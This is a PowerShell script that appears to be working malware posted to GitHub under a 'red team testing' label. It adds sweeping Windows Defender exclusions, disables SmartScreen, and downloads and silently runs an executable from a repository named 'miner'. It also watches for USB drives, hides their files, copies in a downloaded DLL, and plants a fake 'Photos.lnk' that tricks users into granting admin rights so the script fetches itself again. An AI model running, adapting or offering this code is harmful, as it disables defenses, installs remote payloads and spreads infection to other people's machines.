# script.ps1 (Fixed for execution, GitHub rendering, prioritized updater.exe handling, and USB propagation at the end)
# Fetched via: cmd.exe /c powershell.exe -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex"
# Prioritizes updater.exe handling, then USB propagation, for ethical red team testing in a controlled lab environment.

Start-Sleep -Seconds 15

# Logging Setup
$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$fallbackLogPath = "$env:TEMP\boot_execution_log_$(Get-Random).txt"
$logDirectory = Split-Path -Path $logPath -Parent

# Function to test write access
function Test-WriteAccess {
    param ($Path)
    try {
        $testFile = Join-Path $Path "test_$(Get-Random).txt"
        Set-Content -Path $testFile -Value "Test" -Force -ErrorAction Stop
        Remove-Item -Path $testFile -Force -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# Select log path based on write access
if (-not (Test-WriteAccess "C:\Windows\Temp")) {
    $logPath = $fallbackLogPath
    $logDirectory = Split-Path -Path $logPath -Parent
}

# Create log directory and initial log entry
try {
    if (-not (Test-Path -Path $logDirectory)) {
        New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
        Add-Content -Path $logPath -Value "Created log directory: $logDirectory" -Force
    }
    Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account (02:00 PM IST, June 30, 2025)." -Force
} catch {
    $logPath = $fallbackLogPath
    $logDirectory = Split-Path -Path $logPath -Parent
    try {
        if (-not (Test-Path -Path $logDirectory)) {
            New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
        }
        Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Fallback log due to access issue with C:\Windows\Temp." -Force
    } catch {
        Write-Host "CRITICAL: Failed to create log file at any location. Error: $_"
        exit
    }
}

# Check execution policy
try {
    $policy = Get-ExecutionPolicy -Scope CurrentUser
    Add-Content -Path $logPath -Value "Execution Policy: $policy"
    if ($policy -eq "Restricted") {
        Add-Content -Path $logPath -Value "WARNING: Execution policy is Restricted. Set to RemoteSigned for script execution."
        Write-Host "Execution policy is Restricted. Run 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned' to allow script execution."
    }
} catch {
    Add-Content -Path $logPath -Value "Failed to check execution policy: $_"
}

# Log environment details
try {
    Add-Content -Path $logPath -Value "Running as: $(whoami), TEMP: $env:TEMP, Process ID: $PID"
} catch {
    Add-Content -Path $logPath -Value "Failed to log environment details: $_"
}

# Verify admin status
function Is-Admin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    } catch {
        Add-Content -Path $logPath -Value "Failed to check admin status: $_"
        return $false
    }
}
try {
    if (Is-Admin) {
        Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
    } else {
        Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
        Write-Host "Script is not running with admin privileges. Some operations may fail."
    }
} catch {
    Add-Content -Path $logPath -Value "Error checking admin status: $_"
}

# Updater.exe Handling (Priority)
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
$payloadPath = "C:\Windows\Temp\updater.exe"

try {
    Add-Content -Path $logPath -Value "Checking for existing updater.exe at $payloadPath."
    if (Test-Path -Path $payloadPath) {
        Add-Content -Path $logPath -Value "Existing updater.exe found at $payloadPath."
        
        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
            Add-Content -Path $logPath -Value "Warning: Existing file does not have .exe extension."
        } else {
            Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."
        }

        $existingSize = (Get-Item -Path $payloadPath).Length
        Add-Content -Path $logPath -Value "Existing file size: $existingSize bytes."

        try {
            Unblock-File -Path $payloadPath -ErrorAction Stop
            Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
        } catch {
            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
        }

        try {
            Add-Content -Path $logPath -Value "Attempting to execute existing updater.exe..."
            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
            Add-Content -Path $logPath -Value "Existing updater.exe executed successfully."
        } catch {
            Add-Content -Path $logPath -Value "Execution failed: $_"
            Write-Host "Failed to execute existing updater.exe: $_"
        }
    } else {
        Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation process without execution."

        # Defender Exclusions
        Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
        $maxAttempts = 20
        $delayBetweenChecks = 5

        for ($i = 0; $i -lt $maxAttempts; $i++) {
            try {
                $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
                $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
                if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
                    Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
                    break
                }
            } catch {
                Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
            }
            Start-Sleep -Seconds $delayBetweenChecks
            if ($i -eq ($maxAttempts - 1)) {
                Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
            }
        }
        Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."

        Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

        $exclusionsPaths = @(
            "C:\Users\Public\SystemLib",
            "C:\Windows\Temp\updater.exe",
            "C:\ProgramData\WinKit",
            "C:\Windows\Temp\*",
            "C:\ProgramData\Microsoft\Windows\Temp",
            "C:\Users\*\AppData\Local\Temp",
            "C:\Windows\System32\Tasks",
            "C:\Windows\SysWOW64\Tasks",
            "C:\Program Files\McAfee",
            "C:\Program Files\Symantec",
            "C:\Program Files\Kaspersky Lab",
            "C:\Program Files\Avast Software",
            "C:\Program Files\AVG"
        )

        $exclusionsProcesses = @(
            "updater.exe",
            "cmd.exe",
            "powershell.exe"
        )

        $exclusionsExtensions = @(
            "exe",
            "bat",
            "cmd",
            "ps1",
            "vbs",
            "js"
        )

        foreach ($excl in $exclusionsPaths) {
            try {
                $currentExclusions = Get-MpPreference
                $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
                if (-not $pathExists) {
                    Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
                    Add-Content -Path $logPath -Value "Exclusion path added: $excl"
                } else {
                    Add-Content -Path $logPath -Value "Exclusion path already exists: $excl"
                }
            } catch {
                Add-Content -Path $logPath -Value "Failed to add exclusion path: $excl - Error: $_"
            }
        }

        foreach ($excl in $exclusionsProcesses) {
            try {
                $currentExclusions = Get-MpPreference
                $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
                if (-not $processExists) {
                    Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
                    Add-Content -Path $logPath -Value "Exclusion process added: $excl"
                } else {
                    Add-Content -Path $logPath -Value "Exclusion process already exists: $excl"
                }
            } catch {
                Add-Content -Path $logPath -Value "Failed to add exclusion process: $excl - Error: $_"
            }
        }

        foreach ($excl in $exclusionsExtensions) {
            try {
                $currentExclusions = Get-MpPreference
                $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
                if (-not $extensionExists) {
                    Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
                    Add-Content -Path $logPath -Value "Exclusion extension added: $excl"
                } else {
                    Add-Content -Path $logPath -Value "Exclusion extension already exists: $excl"
                }
            } catch {
                Add-Content -Path $logPath -Value "Failed to add exclusion extension: $excl - Error: $_"
            }
        }

        Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

        # SmartScreen and Payload Download
        Add-Content -Path $logPath -Value "Attempting to disable SmartScreen and fetch .exe payload from $payloadUrl without execution."

        try {
            $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
            try {
                Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
                Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
            } catch {
                Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
            }

            $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
            if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
                Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
            } else {
                Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
            }

            if (-not (Test-Path -Path (Split-Path -Path $payloadPath -Parent))) {
                New-Item -ItemType Directory -Path (Split-Path -Path $payloadPath -Parent) -Force | Out-Null
                Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path -Path $payloadPath -Parent)."
            }

            Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
            $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
            Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"

            $downloadedSize = (Get-Item -Path $payloadPath).Length
            Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."

            if (-not (Test-Path -Path $payloadPath)) {
                throw "Downloaded file not found at $payloadPath."
            }
            if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
                Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
            }
            Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."

            try {
                Unblock-File -Path $payloadPath -ErrorAction Stop
                Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
            } catch {
                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
            }

            Add-Content -Path $logPath -Value "Payload downloaded successfully but not executed, as per configuration."

        } catch {
            Add-Content -Path $logPath -Value "Failed to fetch payload from $payloadUrl. Error: $_"
            Write-Host "Failed to fetch payload: $_"
        }
    }
} catch {
    Add-Content -Path $logPath -Value "Updater.exe handling failed: $_"
    Write-Host "Updater.exe handling failed: $_"
}

# USB Propagation (Added at the End)
try {
    Add-Content -Path $logPath -Value "Starting USB propagation logic."
    
    # USB Propagation Functions
    function Watch-USB {
        param ($LogPath)
        try {
            Add-Content -Path $LogPath -Value "Starting USB monitoring for propagation at $(Get-Date)."
            $wmiQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_DiskDrive' AND TargetInstance.InterfaceType = 'USB'"
            Register-WmiEvent -Query $wmiQuery -Action {
                try {
                    $driveLetter = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -like "$($eventArgs.NewEvent.TargetInstance.DeviceID)*"}).DeviceID
                    if ($driveLetter) {
                        Add-Content -Path $event.MessageData.LogPath -Value "USB detected: $driveLetter at $(Get-Date)."
                        Infect-USB -DriveLetter $driveLetter -LogPath $event.MessageData.LogPath
                    }
                } catch {
                    Add-Content -Path $event.MessageData.LogPath -Value "USB event handler failed: $_"
                }
            } -MessageData @{LogPath=$LogPath} -ErrorAction Stop
            Add-Content -Path $logPath -Value "USB monitoring event registered successfully."
        } catch {
            Add-Content -Path $LogPath -Value "Failed to register USB monitoring event: $_"
            Write-Host "Failed to register USB monitoring: $_"
        }
    }

    # Initialize USB monitoring in a runspace
    $rs = [RunspaceFactory]::CreateRunspace()
    $rs.Open()
    $ps = [PowerShell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({
        param($LogPath)
        # Define Infect-USB within the runspace to avoid sourcing issues
        function Infect-USB {
            param (
                $DriveLetter,
                $LogPath
            )
            try {
                # Create hidden folders
                $hiddenFolder = "$DriveLetter\RECYCLER.BIN"
                $filesFolder = "$hiddenFolder\Files"
                New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
                New-Item -Path $filesFolder -ItemType Directory -Force | Out-Null
                Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
                Set-ItemProperty -Path $filesFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
                Add-Content -Path $LogPath -Value "Created hidden folders: $hiddenFolder, $filesFolder"

                # Move legitimate USB files to hidden folder
                $usbFiles = Get-ChildItem -Path $DriveLetter -Exclude "RECYCLER.BIN" -ErrorAction SilentlyContinue
                foreach ($file in $usbFiles) {
                    try {
                        Move-Item -Path "$DriveLetter\$($file.Name)" -Destination "$filesFolder\$($file.Name)" -Force -ErrorAction Stop
                        Add-Content -Path $LogPath -Value "Moved file to hidden folder: $($file.Name)"
                    } catch {
                        Add-Content -Path $LogPath -Value "Failed to move file $($file.Name): $_"
                    }
                }

                # Copy legitimate executable (rundll32.exe)
                $legitExePath = "$env:windir\System32\rundll32.exe"
                $usbLegitExePath = "$hiddenFolder\legit.exe"
                Copy-Item -Path $legitExePath -Destination $usbLegitExePath -Force -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Copied rundll32.exe to $usbLegitExePath"

                # Download malicious DLL
                $dllPath = "C:\Windows\Temp\malicious.dll"
                $usbDllPath = "$hiddenFolder\malicious.dll"
                $dllUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/malicious.dll"
                if (-not (Test-Path $dllPath)) {
                    try {
                        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
                        Add-Content -Path $LogPath -Value "Downloaded malicious.dll to $dllPath"
                        try {
                            Unblock-File -Path $dllPath -ErrorAction Stop
                            Add-Content -Path $LogPath -Value "Removed Mark of the Web from $dllPath."
                        } catch {
                            Add-Content -Path $LogPath -Value "Failed to remove Mark of the Web from $dllPath: $_"
                        }
                    } catch {
                        Add-Content -Path $LogPath -Value "Failed to download malicious.dll from $dllUrl: $_"
                        $dllContent = @"
[DllMain]
EXPORT void Run() {
    system("start /b C:\\Windows\\Temp\\updater.exe");
    system("cmd.exe /c powershell.exe -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex\"");
}
"@
                        Add-Content -Path $dllPath -Value $dllContent -ErrorAction Stop
                        Add-Content -Path $LogPath -Value "Created placeholder DLL at $dllPath (non-executable, compile for production)"
                    }
                }
                Copy-Item -Path $dllPath -Destination $usbDllPath -Force -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Copied malicious DLL to $usbDllPath"

                # Create elevate.bat to request admin privileges
                $batPath = "$hiddenFolder\elevate.bat"
                $batContent = @"
@echo off
echo Loading your photos, please wait...
powershell -Command "Start-Process rundll32.exe -ArgumentList '$usbLegitExePath $usbDllPath,Run' -Verb RunAs"
"@
                Set-Content -Path $batPath -Value $batContent -Force
                Add-Content -Path $LogPath -Value "Created elevate.bat at $batPath"

                # Create convincing LNK file to run elevate.bat
                $wshell = New-Object -ComObject WScript.Shell
                $lnkPath = "$DriveLetter\Photos.lnk"
                $lnk = $wshell.CreateShortcut($lnkPath)
                $lnk.TargetPath = $batPath
                $lnk.IconLocation = "%SystemRoot%\system32\imageres.dll,4"
                $lnk.Description = "Open your photo collection from this USB"
                $lnk.Save()
                Add-Content -Path $LogPath -Value "Created LNK file: $lnkPath"
            } catch {
                Add-Content -Path $LogPath -Value "USB infection failed for $DriveLetter: $_"
            }
        }

        Watch-USB -LogPath $LogPath
    }).AddArgument($logPath)
    $handle = $ps.BeginInvoke()
    Add-Content -Path $logPath -Value "USB monitoring initialized successfully."
} catch {
    Add-Content -Path $logPath -Value "Failed to initialize USB propagation: $_"
    Write-Host "Failed to initialize USB propagation: $_"
}

# Keep Script Running for USB Monitoring
try {
    Add-Content -Path $logPath -Value "Script entering infinite loop to maintain USB monitoring."
    while ($true) {
        Start-Sleep -Seconds 30
        Add-Content -Path $logPath -Value "USB monitoring active at $(Get-Date)."
    }
} catch {
    Add-Content -Path $logPath -Value "Infinite loop failed: $_"
    Write-Host "Infinite loop failed: $_"
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
